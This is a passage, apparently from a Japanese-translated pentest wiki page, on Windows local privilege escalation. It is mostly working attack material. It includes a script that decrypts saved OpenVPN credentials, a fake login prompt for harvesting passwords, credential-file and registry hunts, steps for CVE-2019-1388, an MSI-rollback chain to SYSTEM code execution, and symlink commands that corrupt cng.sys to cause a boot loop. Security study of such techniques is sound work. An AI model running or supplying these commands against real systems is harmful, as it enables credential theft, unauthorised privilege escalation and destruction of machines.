</authentication>
```
### OpenVPN 認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 認証情報を尋ねる

ユーザーが知っていると思われる場合は、いつでも**ユーザーに自身の認証情報、または別のユーザーの認証情報を入力するよう求める**ことができます（ただし、クライアントに直接**認証情報**を**尋ねる**のは非常に**リスクが高い**ことに注意してください）。
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または**Base64**で含まれていた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索します：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin 内の認証情報

認証情報がないか、Bin も確認してください

複数のプログラムによって保存された**パスワードを復元**するには、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報が存在する可能性のあるその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリから openssh keys を抽出。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

**Chrome または Firefox** の passwords が保存されている dbs を確認する必要があります。\
また、ブラウザの履歴、bookmarks、favourites も確認してください。そこに **passwords が** 保存されている可能性があります。

ブラウザから passwords を抽出する Tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows operating system に組み込まれた technology で、異なる言語で作られた software components 間の **intercommunication** を可能にします。各 COM component は **class ID (CLSID)** によって **identified** され、各 component は、interface IDs (IIDs) によって識別される 1 つ以上の interfaces を通じて functionality を公開します。

COM classes と interfaces は、それぞれ **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** の下にある registry で定義されています。この registry は、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** を merge することで作成されます。

この registry の CLSIDs 内には、child registry **InProcServer32** があります。これには、**DLL** を指す **default value** と、**ThreadingModel** という value が含まれています。**ThreadingModel** には **Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single または Multi)、**Neutral** (Thread Neutral) を指定できます。

![Browsers History - COM DLL Overwriting: この registry の CLSIDs 内には、DLL を指す default value と value called ThreadingModel を含む child registry InProcServer32 があります...](<../../images/image (729).png>)

基本的に、実行される **DLLs のいずれかを overwrite** でき、その DLL が別の user によって実行される場合、**privileges を escalate** できます。

attackers が persistence mechanism として COM Hijacking を使用する方法については、以下を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルと registry 内の Generic Password search**

**ファイル contents を検索する**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索する Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin で、victim 内の credentials を検索するすべての metasploit POST module を**automatically execute**するために私が作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで説明されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、system からパスワードを抽出するもう 1 つの優れた tool です。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、データを clear text で保存する複数の tool（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM として実行されているプロセスが、別のプロセスを**（`OpenProcess()`）**フルアクセスで開いた**とします。同じプロセスが、**低い権限で新しいプロセスを作成し**（`CreateProcess()`）、**メインプロセスの開いているすべてのハンドルを継承**しているとします。\
この場合、**低権限プロセスに対するフルアクセス**を持っていれば、`OpenProcess()` で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcode を inject**できます。\
**この脆弱性の検出方法と exploit 方法**については、[この例](leaked-handle-exploitation.md)を参照してください。\
**異なる権限レベルで継承された、プロセスおよびスレッドのより多くのオープンハンドル（フルアクセスだけではありません）をテストおよび abuse する方法について、より詳しく説明した**[**こちらの別の post**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)も参照してください。

## Named Pipe Client Impersonation

**pipes** と呼ばれる共有メモリセグメントにより、プロセス間の通信およびデータ転送が可能になります。

Windows には **Named Pipes** と呼ばれる機能があり、関係のないプロセス同士でも、異なるネットワーク経由でデータを共有できます。これは client/server アーキテクチャに似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**client** が pipe 経由でデータを送信すると、pipe を設定した **server** は、必要な **SeImpersonate** 権限を持っている場合、**client の identity を引き受ける**ことができます。pipe 経由で通信する**特権プロセス**を特定し、そのプロセスを mimic できれば、自分が確立した pipe とそのプロセスが interact した際に、そのプロセスの identity を採用して**より高い権限を取得**できる可能性があります。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)に役立つガイドがあります。

また、次の tool を使用すると、burp のような tool で **named pipe communication を intercept**できます：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。**こちらの tool では、すべての pipe を list および確認して privescs を探す**ことができます：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service（TapiSrv）は server mode で `\\pipe\\tapsrv`（MS-TRP）を公開します。remote authenticated client は、mailslot ベースの async event path を abuse して、`ClientAttach` を任意の **4-byte write** に変換できます。書き込み先は `NETWORK SERVICE` が writable な既存ファイルで、その後 Telephony admin rights を取得し、service として任意の DLL を load できます。Full flow:

- `pszDomainUser` に writable な既存パスを設定して `ClientAttach` → service は `CreateFileW(..., OPEN_EXISTING)` 経由でそのパスを開き、async event writes に使用します。
- 各 event は、`Initialize` で attacker-controlled な `InitContext` をその handle に書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）で line app を register し、`TRequestMakeCall`（`Req_Func 121`）を trigger し、`GetAsyncEvents`（`Req_Func 0`）経由で fetch した後、unregister/shutdown して deterministic writes を繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分自身を追加して reconnect し、任意の DLL path を指定して `GetUIDllName` を call すると、`NETWORK SERVICE` として `TSPI_providerUIIdentify` が実行されます。

詳細:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows で実行される可能性のある File Extensions

**[https://filesec.io/](https://filesec.io/)** の page を確認してください。

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW` に forward された Clickable Markdown links は、危険な URI handlers（`file:`、`ms-appinstaller:`、または登録済みの scheme）を trigger し、current user として attacker-controlled files を実行する可能性があります。詳細については、次を参照してください。

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

user として shell を取得した場合、**command line で credentials を渡している** scheduled tasks やその他の processes が実行されている可能性があります。以下の script は、2 秒ごとに process command lines を capture し、現在の state と前回の state を比較して、差分があれば output します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

コンソールまたは RDP 経由で graphical interface にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、unprivileged user から terminal や「NT\AUTHORITY SYSTEM」などの別の process を実行できます。

これにより、同じ vulnerability を使って privileges を escalate し、同時に UAC を bypass できます。さらに、何も install する必要はなく、process 中に使用される binary は Microsoft によって署名・発行されています。

影響を受けるシステムには、次のものがあります:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性をexploitするには、以下の手順を実行する必要があります。
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium から High Integrity Level / UAC Bypass へ

**Integrity Levels について学ぶには、こちらを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses について学ぶには、こちらを読んでください:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename から SYSTEM EoP へ

[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) で説明されている technique と、[**こちらで入手できる exploit code**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) です。

この攻撃では基本的に、Windows Installer の rollback 機能を悪用し、アンインストール処理中に正規ファイルを悪意のあるファイルへ置き換えます。そのため、攻撃者は **malicious MSI installer** を作成する必要があります。この installer は `C:\Config.Msi` フォルダーを hijack するために使用されます。その後、このフォルダーは Windows Installer によって、他の MSI package のアンインストール中に rollback ファイルを保存するために使用されます。rollback ファイルには malicious payload が書き込まれます。

要約した technique は次のとおりです。

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空にする）**

- Step 1: MSI をインストールする
- 書き込み可能なフォルダー（`TARGETDIR`）に harmless file（例: `dummy.txt`）をインストールする `.msi` を作成します。
- installer を **"UAC Compliant"** として設定し、**non-admin user** が実行できるようにします。
- インストール後も、ファイルへの **handle** を開いたままにします。

- Step 2: アンインストールを開始する
- 同じ `.msi` をアンインストールします。
- アンインストール処理がファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback backups）へ rename し始めます。
- `GetFinalPathNameByHandle` を使用して、開いているファイルの **handle** を **poll** し、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: Custom Syncing
- `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれており、次の処理を行います。
- `.rbf` が書き込まれたことを signal します。
- その後、アンインストールを続行する前に、別の event を **wait** します。

- Step 4: `.rbf` の削除をブロックする
- signal を受け取ったら、`FILE_SHARE_DELETE` なしで **`.rbf file` を open** します。これにより、ファイルの削除が **prevent** されます。
- その後、アンインストールを完了できるように signal を返します。
- Windows Installer は `.rbf` の削除に失敗し、すべての内容を削除できないため、`C:\Config.Msi` は削除されません。

- Step 5: `.rbf` を手動で削除する
- あなた（attacker）が `.rbf` ファイルを手動で削除します。
- これで **`C:\Config.Msi` は空** になり、hijack の準備が整います。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability を trigger** して `C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback Scripts を Malicious Ones に置き換える**

- Step 6: Weak ACLs で `C:\Config.Msi` を再作成する
- `C:\Config.Msi` フォルダーを自分で再作成します。
- **weak DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` を持つ **handle** を開いたままにします。

- Step 7: 別のインストールを実行する
- `.msi` を再度インストールします。以下を指定します。
- `TARGETDIR`: Writable location。
- `ERROROUT`: forced failure を trigger する variable。
- このインストールは、`.rbs` と `.rbf` を再度読み取る **rollback** を trigger するために使用されます。

- Step 8: `.rbs` を monitor する
- `ReadDirectoryChangesW` を使用して `C:\Config.Msi` を monitor し、新しい `.rbs` が現れるまで待ちます。
- その filename を取得します。

- Step 9: Rollback 前に Sync する
- `.msi` には **custom install action (`SyncBeforeRollback`)** が含まれており、次の処理を行います。
- `.rbs` が作成されたときに event を signal します。
- その後、続行する前に **wait** します。

- Step 10: Weak ACL を再適用する
- `.rbs created` event を受信した後:
- Windows Installer は `C:\Config.Msi` に **strong ACLs** を再適用します。
- しかし、`WRITE_DAC` を持つ handle をまだ保持しているため、再び **weak ACLs** を再適用できます。

> ACLs は **handle open 時にのみ enforce** されるため、引き続きフォルダーへ write できます。

- Step 11: Fake `.rbs` と `.rbf` を配置する
- `.rbs` ファイルを、Windows に次の処理を指示する **fake rollback script** で overwrite します。
- `.rbf` ファイル（malicious DLL）を **privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）へ restore します。
- **malicious SYSTEM-level payload DLL** を含む fake `.rbf` を配置します。

- Step 12: Rollback を trigger する
- sync event を signal して、installer を再開させます。
- **type 19 custom action (`ErrorOut`)** は、既知の地点で意図的にインストールを fail させるよう設定されています。
- これにより **rollback が開始** されます。

- Step 13: SYSTEM が DLL をインストールする
- Windows Installer:
- malicious `.rbs` を読み取ります。
- `.rbf` DLL を target location に copy します。
- これで、**SYSTEM-loaded path に malicious DLL** が配置されます。

- Final Step: SYSTEM Code を実行する
- DLL hijack を行った DLL を load する、trusted **auto-elevated binary**（例: `osk.exe`）を実行します。
- **Boom**: code が **SYSTEM として** 実行されます。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

主な MSI rollback technique（前述の technique）は、**entire folder**（例: `C:\Config.Msi`）を削除できることを前提としています。しかし、vulnerability が **arbitrary file deletion** しか許可しない場合はどうでしょうか？

**NTFS internals** を exploit できます。すべてのフォルダーには、次の名前の hidden alternate data stream があります:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
この stream には、フォルダーの **index metadata** が格納されています。

そのため、フォルダーの **`::$INDEX_ALLOCATION` stream** を **delete** すると、NTFS はファイルシステムから **フォルダー全体を削除**します。

これは、次のような標準のファイル削除 API を使用して実行できます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容の削除から SYSTEM EoP へ
プリミティブで任意のファイルやフォルダーは削除できなくても、**攻撃者が制御するフォルダーの *内容* は削除できる**場合はどうでしょうか？

1. Step 1: 囮フォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock により**実行が一時停止されます**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ 3: SYSTEM process（例: `SilentCleanup`）をトリガーする
- この process はフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、control が callback に渡されます。

4. ステップ 4: oplock callback 内で削除先をリダイレクトする

- Option A: `file1.txt` を別の場所へ移動する
- これにより、oplock を破壊せずに `folder1` を空にできます。
- `file1.txt` を直接削除しないでください。oplock が早期に解放されてしまいます。

- Option B: `folder1` を **junction** に変換する：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する：
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダーのメタデータを保存する NTFS 内部ストリームを対象とします。これを削除すると、フォルダーが削除されます。

5. Step 5: oplock を解放する
- SYSTEM process は処理を続行し、`file1.txt` を削除しようとします。
- しかし、junction + symlink により、実際に削除されるのは次のものです:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダ作成から恒久的な DoS へ

**ファイルを書き込めない**、または**弱い権限を設定できない**場合でも、**SYSTEM/admin として任意のフォルダを作成できる** primitive を exploit します。

**重要な Windows driver** の名前を付けた**フォルダ**（ファイルではありません）を作成します。例：
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` kernel-mode driver に対応します。
- **フォルダーとして事前に作成すると**、Windows は起動時に実際の driver をロードできなくなります。
- その後、Windows は起動中に `cng.sys` のロードを試みます。
- フォルダーを検出すると、**実際の driver の解決に失敗し**、**クラッシュするか起動を停止します**。
- **fallback はなく**、外部からの介入（例: boot repair またはディスクアクセス）なしに**復旧する方法もありません**。

### 特権ログ/バックアップパス + OM symlinks から任意ファイルの overwrite / boot DoS へ

**特権 service** が **writable config** から読み取ったパスに logs/exports を書き込む場合、**Object Manager symlinks + NTFS mount points** でそのパスを redirect し、特権による書き込みを任意ファイルの overwrite に変えられます（**SeCreateSymbolicLinkPrivilege がなくても**可能）。

**Requirements**
- target path を保存する config が attacker によって writable であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- そのパスに書き込む特権 operation（log、export、report）。

**Example chain**
1. config を読み取り、特権 log の保存先を特定します。例: `C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin 権限なしでパスを redirect します。
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. privileged component がログを書き込むのを待ちます（例: admin が「send test SMS」を実行する）。この書き込みは `C:\Windows\System32\cng.sys` に行われます。
4. 上書きされた target を調査し（hex/PE parser）、corruption を確認します。reboot によって Windows が改ざんされた driver path をロードするため、**boot loop DoS** が発生します。これは、privileged service が write 用に開く protected file なら、どれにでも応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` からロードされますが、`C:\Windows\System32\cng.sys` にコピーが存在する場合は、そちらが先に試行される可能性があります。そのため、破損データの信頼できる DoS sink になります。



## **High Integrity から System へ**

### **New service**

すでに High Integrity process 上で実行している場合、**SYSTEM への path** は、単に **new service を作成して実行する**だけで簡単に確保できます:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービスバイナリを作成する場合は、それが有効なサービスであること、またはバイナリが必要なアクションを迅速に実行することを確認してください。有効なサービスでない場合、20秒で強制終了されます。

### AlwaysInstallElevated

High Integrity プロセスから、**AlwaysInstallElevated レジストリエントリを有効化**し、_**.msi**_ wrapper を使用して reverse shell を**インストール**できます。\
[関連するレジストリキーと _.msi_ package のインストール方法についての詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちらで確認できます**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges を持っている場合（おそらく、すでに High Integrity のプロセス内で見つかります）、SeDebug privilege により**ほぼすべてのプロセス**（protected processes を除く）を**open**し、そのプロセスの token を**copy**して、その token を使用した**任意のプロセスを作成**できます。\
この technique では通常、**すべての token privileges を持つ SYSTEM として実行されているプロセスを選択します**（_はい、すべての token privileges を持たない SYSTEM プロセスも見つかります_）。\
**提案した technique を実行するコード例は** [**こちらで確認できます**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この technique は meterpreter が `getsystem` で privilege escalation を行うために使用します。この technique は、**pipe を作成し、その pipe に書き込む service を作成または abuse する**というものです。その後、**`SeImpersonate`** privilege を使用して pipe を作成した **server** は、pipe client（service）の token を**impersonate**し、SYSTEM privileges を取得できます。\
name pipes について[**詳しく知りたい場合はこちらをお読みください**](#named-pipe-client-impersonation)。\
name pipes を使用して [**high integrity から System に移行する方法の例はこちらをお読みください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM** として実行されている **process** によって**loaded**される dll の **hijack**に成功すると、その権限で任意のコードを実行できます。したがって Dll Hijacking はこの種の privilege escalation にも有用です。さらに、**dll のロードに使用されるフォルダーへの write permissions** を持つため、**high integrity process からのほうがはるかに簡単に実行できます**。\
**Dll hijacking の詳細は** [**こちらで確認できます**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**読む:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors の調査に最適な tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files をチェック（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 一部の可能性がある misconfigurations をチェックし、情報を収集（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations をチェック**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP の保存された session 情報を抽出します。local では -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から credentials を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集した passwords を domain 全体に対して spray します**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell ADIDNS/LLMNR/mDNS spoofer および man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を検索（Watson のため DEPRECATED）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を検索（VisualStudio を使用して compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を検索して host を enumerate します（privesc tool というより情報収集 tool）（compile が必要）**(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数の software から credentials を抽出します（github に precompiled exe があります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration をチェック（github に executable precompiled があります）。推奨されません。Win10 では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能性のある misconfigurations をチェック（python からの exe）。推奨されません。Win10 では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post に基づいて作成された tool（正常に動作させるために accesschk へのアクセスは必要ありませんが、使用することはできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の output を読み取り、動作する exploits を推奨します（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の output を読み取り、動作する exploits を推奨します（local python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しいバージョンの .NET を使用して project を compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host にインストールされている .NET のバージョンを確認するには、次を実行します。
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
